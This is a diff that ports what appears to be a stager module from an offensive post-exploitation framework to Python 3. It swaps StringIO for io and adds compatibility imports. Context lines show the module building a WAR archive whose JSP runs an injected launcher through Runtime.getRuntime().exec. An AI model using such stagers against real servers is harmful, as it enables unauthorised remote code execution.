@@ -1,9 +1,13 @@
 from __future__ import print_function
+from future import standard_library
+standard_library.install_aliases()
+from builtins import str
+from builtins import object
 from lib.common import helpers
 import zipfile
-import StringIO
+import io
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -139,7 +143,7 @@ Process p=Runtime.getRuntime().exec("'''+str(launcher)+'''");
 ''' %(appName, appName)
 
             # build the in-memory ZIP and write the three files in
-            warFile = StringIO.StringIO() 
+            warFile = io.StringIO() 
             zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)
 
             zipData.writestr("META-INF/MANIFEST.MF", manifest)
